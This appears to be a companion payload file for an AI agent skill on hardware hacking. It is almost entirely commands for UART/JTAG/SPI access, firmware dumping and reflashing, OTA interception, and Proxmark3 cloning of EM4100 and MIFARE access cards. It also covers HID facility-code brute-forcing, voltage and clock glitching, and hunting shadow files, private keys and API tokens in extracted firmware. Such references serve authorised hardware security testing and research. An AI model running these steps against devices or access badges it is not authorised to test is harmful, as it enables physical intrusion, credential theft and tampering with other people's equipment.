# Hardware Security -- Payloads & Commands

> This file is a companion to `SKILL.md`, containing hardware attack commands, debug interface payloads,
> firmware extraction one-liners, and RFID/NFC cloning commands organized by attack phase.

---

## Index

1. [UART Enumeration](#1-uart-enumeration)
2. [JTAG Discovery and Connection](#2-jtag-discovery-and-connection)
3. [SPI/I2C Interface Access](#3-spii2c-interface-access)
4. [Firmware Extraction](#4-firmware-extraction)
5. [Firmware Analysis](#5-firmware-analysis)
6. [RFID/NFC Attacks](#6-rfidnfc-attacks)
7. [Fault Injection Setup](#7-fault-injection-setup)
8. [Post-Extraction Credential Hunting](#8-post-extraction-credential-hunting)

---

## 1. UART Enumeration

### 1.1 Baud Rate Detection

Common baud rates to try in order of likelihood for embedded devices:
```
115200, 57600, 38400, 19200, 9600, 4800, 2400, 1200
```

```bash
# Auto-detect baud rate using baudrate.py (from devttys0)
python3 baudrate.py -p /dev/ttyUSB0

# Try each baud rate manually with minicom (Ctrl+A then Z for menu, Q to quit)
minicom -b 115200 -D /dev/ttyUSB0
minicom -b 57600  -D /dev/ttyUSB0
minicom -b 38400  -D /dev/ttyUSB0
minicom -b 9600   -D /dev/ttyUSB0

# picocom alternative (simpler, Ctrl+A then Ctrl+Q to quit)
picocom -b 115200 /dev/ttyUSB0
picocom -b 57600  /dev/ttyUSB0

# screen alternative
screen /dev/ttyUSB0 115200
screen /dev/ttyUSB0 57600
screen /dev/ttyUSB0 9600

# cu (part of uucp package)
cu -l /dev/ttyUSB0 -s 115200

# List available serial devices
ls -la /dev/ttyUSB* /dev/ttyACM* 2>/dev/null
dmesg | grep -E 'ttyUSB|ttyACM|cp210x|ch34|ftdi' | tail -20
```

### 1.2 UART Pin Identification

```bash
# Multimeter voltage probing — look for pin held at logic-high (3.3 V or 5 V) at idle: that is TX
# GND pins read 0 V against known ground
# RX pins read no voltage at idle (floating or pulled slightly)

# Logic analyzer: capture boot sequence at 3.3 V threshold, decode UART at common baud rates
# sigrok-cli: decode UART from logic analyzer capture file
sigrok-cli -i capture.sr -P uart:baudrate=115200:rx=D0:tx=D1

# During boot, TX line will toggle — trigger on falling edge to capture boot log
```

### 1.3 UART Connection One-Liners

```bash
# Connect and log all output to file
picocom -b 115200 /dev/ttyUSB0 | tee /tmp/uart-session.log

# Send string to device (e.g., interrupt U-Boot countdown)
# Press any key during U-Boot countdown in terminal

# Interact with root shell found on UART
picocom -b 115200 --flow none /dev/ttyUSB0

# Non-interactive read (grab boot log then disconnect)
timeout 30 cat /dev/ttyUSB0 > /tmp/boot-log.txt &
stty -F /dev/ttyUSB0 115200 raw

# Python serial one-liner for scripted interaction
python3 -c "
import serial, time
s = serial.Serial('/dev/ttyUSB0', 115200, timeout=2)
time.sleep(0.5)
s.write(b'\n')
print(s.read(4096).decode(errors='replace'))
s.close()
"
```

---

## 2. JTAG Discovery and Connection

### 2.1 JTAGulator Pin Discovery

```
# JTAGulator serial interface (connect via USB, open terminal at 115200 baud)
# Commands entered in JTAGulator interactive menu:

U     # UART discovery mode — scans all channels for UART TX
J     # JTAG discovery mode — brute-forces JTAG pinout
H     # Set target voltage (3.3 V typical: enter '33')

# JTAGulator will try all pin combinations and report which pins respond to JTAG boundary scan
# Output format: TCK=CHx TMS=CHy TDI=CHz TDO=CHw
```

### 2.2 OpenOCD Connection

```bash
# Install OpenOCD
apt-get install -y openocd

# List available interface and target configs
ls /usr/share/openocd/scripts/interface/
ls /usr/share/openocd/scripts/target/

# Connect via FTDI-based JTAG adapter to ARM Cortex-M target
openocd \
  -f interface/ftdi/olimex-arm-usb-ocd.cfg \
  -f target/stm32f1x.cfg

# Connect via Bus Pirate to generic ARM target
openocd \
  -f interface/buspirate.cfg \
  -c "buspirate_port /dev/ttyUSB0" \
  -f target/cortex_m.cfg

# Connect to MIPS-based router (common in consumer routers)
openocd \
  -f interface/ftdi/openocd-usb.cfg \
  -f target/mips_m4k.cfg

# Generic Raspberry Pi GPIO as JTAG (using sysfsgpio or bcm2835gpio)
openocd \
  -f interface/raspberrypi2-native.cfg \
  -c "transport select jtag" \
  -f target/cortex_a.cfg
```

### 2.3 OpenOCD Interactive Commands

```tcl
# In OpenOCD telnet session (connect: telnet localhost 4444)

# Halt the target CPU
halt

# Resume execution
resume

# Step one instruction
step

# Read memory: dump 256 bytes at address 0x00000000
mdw 0x00000000 64

# Dump flash to file (start_addr, byte_count, filename)
dump_image /tmp/firmware.bin 0x00000000 0x00100000

# Write image to flash
flash write_image erase /tmp/patched.bin 0x00000000

# Read CPU registers
reg

# Set a breakpoint
bp 0x08001234 4 hw

# Reset and halt
reset halt

# Get list of flash banks
flash list
flash info 0
```

### 2.4 UrJTAG Alternative

```bash
# Connect to JTAG via UrJTAG (older but supports many adapters)
jtag

# In UrJTAG interactive shell:
# cable ft2232 vid=0x0403 pid=0x6010 
# detect
# print chain
# readmem 0x00000000 1048576 /tmp/firmware.bin
```

---

## 3. SPI/I2C Interface Access

### 3.1 Logic Analyzer Capture

```bash
# Capture SPI boot traffic with sigrok (8-channel logic analyzer required)
sigrok-cli \
  -d fx2lafw \
  --config samplerate=4MHz \
  -C D0,D1,D2,D3 \
  -P spi:clk=D0:miso=D1:mosi=D2:cs=D3 \
  --samples 4000000 \
  -o /tmp/spi-capture.sr

# Decode I2C traffic
sigrok-cli \
  -d fx2lafw \
  --config samplerate=1MHz \
  -C D0,D1 \
  -P i2c:scl=D0:sda=D1 \
  --samples 1000000 \
  -o /tmp/i2c-capture.sr

# Open capture in PulseView GUI for annotation
pulseview /tmp/spi-capture.sr
```

### 3.2 Bus Pirate SPI Read

```bash
# Connect Bus Pirate to SPI flash chip (SOIC clip or probe wires):
# MOSI → SI, MISO → SO, CLK → CLK, CS → CS#, 3.3V → VCC, GND → GND

# Bus Pirate interactive mode
# Open terminal: picocom -b 115200 /dev/ttyUSB0
# In Bus Pirate: 'm' → select SPI mode → set speed, voltage
```

---

## 4. Firmware Extraction

### 4.1 flashrom with CH341A Programmer

```bash
# Identify flash chip connected to CH341A (clip on SPI NOR flash in-circuit)
flashrom -p ch341a_spi

# List supported chips
flashrom -p ch341a_spi --list-supported | grep -i "W25\|MX25\|GD25\|S25"

# Read flash chip to file (retry 3 times for verification)
flashrom -p ch341a_spi -r /tmp/flash_dump_1.bin
flashrom -p ch341a_spi -r /tmp/flash_dump_2.bin
flashrom -p ch341a_spi -r /tmp/flash_dump_3.bin

# Verify all three reads match (bit-for-bit consistency check)
md5sum /tmp/flash_dump_{1,2,3}.bin

# Write patched firmware back to chip
flashrom -p ch341a_spi -w /tmp/patched_firmware.bin

# Erase chip
flashrom -p ch341a_spi -E
```

### 4.2 flashrom with Bus Pirate

```bash
# Read SPI flash via Bus Pirate
flashrom -p buspirate_spi:dev=/dev/ttyUSB0,spispeed=1M -r /tmp/firmware.bin

# Specify chip explicitly if autodetect fails
flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -c "W25Q64BV" -r /tmp/firmware.bin
```

### 4.3 Firmware via JTAG (OpenOCD)

```bash
# Dump entire flash region via OpenOCD (ARM Cortex example)
# In OpenOCD telnet (port 4444):
# dump_image /tmp/firmware_jtag.bin 0x08000000 0x00080000

# Script it non-interactively
echo "halt; dump_image /tmp/firmware_jtag.bin 0x08000000 524288; shutdown" | \
  telnet localhost 4444
```

### 4.4 Firmware via UART / U-Boot

```bash
# Interrupt U-Boot: press any key during "Hit any key to stop autoboot" countdown

# In U-Boot console — dump memory over serial (slow but reliable)
# md.b 0x9f000000 0x400000   (display bytes; redirect to file via logging)

# U-Boot TFTP exfiltration (if network available):
# setenv serverip 192.168.1.100
# setenv ipaddr 192.168.1.200
# tftpput 0x80000000 0x400000 firmware.bin   (if tftpput supported)

# Capture U-Boot md output and parse with xxd
picocom -b 115200 /dev/ttyUSB0 | tee /tmp/uboot-dump.log
# Post-process: extract hex values and convert to binary
grep -oP '[0-9a-f]{8}: [0-9a-f ]+' /tmp/uboot-dump.log | \
  sed 's/.*: //' | xxd -r -p > /tmp/firmware_uart.bin
```

### 4.5 OTA Firmware Interception

```bash
# MITM the firmware update request using mitmproxy
mitmproxy --mode transparent --ssl-insecure

# Or capture with tcpdump during device update check
tcpdump -i eth0 -w /tmp/ota-capture.pcap host <device-ip>

# Extract firmware URL from pcap
tshark -r /tmp/ota-capture.pcap -Y http -T fields -e http.request.full_uri | grep -i 'firm\|updat\|bin'

# Download directly once URL is identified
wget -O /tmp/ota-firmware.bin "http://update.vendor.com/v2.1.3/firmware.bin"
```

---

## 5. Firmware Analysis

### 5.1 binwalk Scanning and Extraction

```bash
# Scan for embedded file signatures and compression types
binwalk firmware.bin

# Entropy analysis (high entropy = compressed/encrypted regions)
binwalk -E firmware.bin

# Extract all embedded files and filesystems
binwalk -e firmware.bin
binwalk -e --run-as=root firmware.bin  # if squashfs extraction requires root

# Extract to specific directory
binwalk -e -C /tmp/extracted/ firmware.bin

# Recursive extraction (extract from extracted files)
binwalk -Me firmware.bin

# Extract with dd using offsets from binwalk scan
# Example: squashfs at offset 0x12345 of size 0x300000
dd if=firmware.bin of=/tmp/squashfs.img bs=1 skip=$((0x12345)) count=$((0x300000))
```

### 5.2 Filesystem Mounting and Extraction

```bash
# SquashFS extraction (most common in consumer devices)
unsquashfs -d /tmp/squashfs-root /tmp/squashfs.img
# or
sasquatch /tmp/squashfs.img  # handles non-standard compressions

# JFFS2 (NAND flash journaling FS)
jefferson /tmp/jffs2.img -d /tmp/jffs2-root/

# CramFS
cramfsck -x /tmp/cramfs-root /tmp/cramfs.img

# ext2/3/4 from firmware
file squashfs-root.img
mount -o loop,ro /tmp/ext2.img /mnt/firmware

# UBIFS (common on NAND-based systems)
modprobe ubi
ubiattach -p /tmp/ubifs.img
mount -t ubifs ubi0_0 /mnt/ubifs

# initramfs/cpio
mkdir /tmp/initrd-root && cd /tmp/initrd-root
cpio -idmv < /tmp/initrd.img
```

### 5.3 Automated Firmware Vulnerability Scan

```bash
# firmwalker: automated scan for interesting files in extracted firmware
git clone https://github.com/craigz28/firmwalker.git
bash firmwalker/firmwalker.sh /tmp/squashfs-root/ /tmp/firmwalker-report.txt

# strings analysis on all binaries
find /tmp/squashfs-root -type f -executable | while read f; do
  strings "$f" | grep -E '(password|passwd|secret|token|key|admin|root|backdoor)' \
    | sed "s|^|$f: |"
done > /tmp/strings-secrets.txt
```

---

## 6. RFID/NFC Attacks

### 6.1 Proxmark3 Card Discovery

```bash
# Start Proxmark3 interactive client
pm3

# In Proxmark3 client:

# Search for low-frequency cards (125 kHz: EM4100, HID, Indala, etc.)
lf search

# Search for high-frequency cards (13.56 MHz: MIFARE, HID iCLASS, NTAG, etc.)
hf search

# Detailed LF card identification
lf em 410x info

# Detailed HF MIFARE card info
hf mf info
```

### 6.2 EM4100 (125 kHz) Clone

```bash
# In Proxmark3 client:

# Read EM4100 card
lf em 410x read

# Clone to T5577 blank card (place T5577 on antenna)
lf em 410x clone --id DEADBEEF01

# Simulate card UID (no physical card needed)
lf em 410x sim --id DEADBEEF01

# Brute-force facility code range (HID proximity)
lf hid brute --fc 101 --start 1 --end 9999 --delay 500
```

### 6.3 MIFARE Classic Clone (13.56 MHz)

```bash
# In Proxmark3 client:

# Check if card is MIFARE Classic and get UID
hf mf info

# Use known-key attacks (MIFARE Classic default keys)
hf mf autopwn

# After autopwn — save card dump
hf mf dump --file /tmp/card.bin

# Restore dump to blank magic card (CUID / GEN1a / GEN2)
hf mf restore --file /tmp/card.bin

# Simulate cloned card
hf mf sim --uid DEADBEEF --atqa 0004 --sak 08
```

### 6.4 NFC/NDEF Operations

```bash
# Read NTAG / NFC Forum tag
hf mf ndefread

# Clone NFC tag UID (requires magic card)
hf 14a sim --type 1 --uid DEADBEEF

# Capture and replay NFC authentication
hf 14a sniff
```

---

## 7. Fault Injection Setup

### 7.1 Voltage Glitching Concept

```bash
# Voltage glitching: momentarily drop VCC to cause CPU to skip instructions
# Target: secure boot signature check, PIN verification, cryptographic operations

# ChipWhisperer Python API (Jupyter/script based)
pip install chipwhisperer

# Basic ChipWhisperer-Nano setup (Python)
python3 -c "
import chipwhisperer as cw
scope = cw.scope()
scope.default_setup()
scope.glitch.clk_src = 'clkgen'
scope.glitch.output = 'glitch_only'
scope.glitch.trigger_src = 'ext_single'
scope.glitch.width = 10.0     # glitch width in % of clock cycle
scope.glitch.offset = -10.0   # glitch offset
target = cw.target(scope)
print('Scope ID:', scope.get_last_found_sn())
"

# Tune glitch parameters:
# width: 5-30% of clock period (start narrow, widen if no effect)
# offset: negative offset = earlier in clock cycle
# Iterate offset from -49 to 49 in small steps until fault observed
```

### 7.2 Clock Glitching

```bash
# Clock glitching: inject extra clock edges to skip instruction fetch
# ChipWhisperer clock glitch output mode
python3 -c "
import chipwhisperer as cw
scope = cw.scope()
scope.default_setup()
scope.glitch.clk_src = 'clkgen'
scope.glitch.output = 'clock_xor'   # XOR glitch into clock line
scope.glitch.trigger_src = 'ext_single'
scope.glitch.width = 8.0
scope.glitch.offset = 0.0
print('Clock glitch configured')
"
```

---

## 8. Post-Extraction Credential Hunting

### 8.1 Credential Patterns

```bash
# Recursive search for common credential patterns in extracted filesystem
FIRMWARE_ROOT="/tmp/squashfs-root"

# Hardcoded passwords
grep -r -i "password\s*=" "$FIRMWARE_ROOT" --include="*.conf" --include="*.cfg" --include="*.sh" --include="*.lua" -l
grep -r -i "passwd" "$FIRMWARE_ROOT/etc/" | head -30

# Shadow/passwd files
cat "$FIRMWARE_ROOT/etc/shadow" 2>/dev/null
cat "$FIRMWARE_ROOT/etc/passwd" 2>/dev/null

# API keys and tokens
grep -r -E "(api_key|apikey|api-key|access_token|secret_key)\s*[=:]" "$FIRMWARE_ROOT" -i | head -20

# Private keys
find "$FIRMWARE_ROOT" -name "*.pem" -o -name "*.key" -o -name "id_rsa" 2>/dev/null
grep -r "BEGIN.*PRIVATE KEY" "$FIRMWARE_ROOT" -l 2>/dev/null
```

### 8.2 Network Service Discovery

```bash
# Find web server configs
find "$FIRMWARE_ROOT" -name "httpd.conf" -o -name "nginx.conf" -o -name "lighttpd.conf" 2>/dev/null

# Find listening services in init scripts
grep -r "telnetd\|ftpd\|sshd\|httpd\|dropbear" "$FIRMWARE_ROOT/etc/init.d/" 2>/dev/null

# Find SSID/WiFi credentials
grep -r -i "ssid\|wifi_pass\|wpa_psk" "$FIRMWARE_ROOT" | head -20

# Find hardcoded IPs and URLs
grep -r -E '([0-9]{1,3}\.){3}[0-9]{1,3}' "$FIRMWARE_ROOT/etc/" | grep -v "255\|0\.0\.0" | head -30
grep -r -E 'https?://[a-zA-Z0-9._/-]+' "$FIRMWARE_ROOT" --include="*.sh" --include="*.lua" | head -20
```

### 8.3 Version and Build Info

```bash
# Find version strings to identify known CVEs
find "$FIRMWARE_ROOT" -name "version" -o -name "VERSION" -o -name "buildinfo" 2>/dev/null | xargs cat 2>/dev/null

strings "$FIRMWARE_ROOT/bin/busybox" 2>/dev/null | grep -E 'BusyBox v[0-9]'

# Find build timestamps and compiler info
strings "$FIRMWARE_ROOT/bin/httpd" 2>/dev/null | grep -E 'GCC|clang|built|compiled' | head -10

# Check OpenSSL version for known vulns
find "$FIRMWARE_ROOT" -name "libssl*" -o -name "libcrypto*" 2>/dev/null
strings "$FIRMWARE_ROOT/usr/lib/libssl.so.1.0.0" 2>/dev/null | grep "OpenSSL" | head -5
```
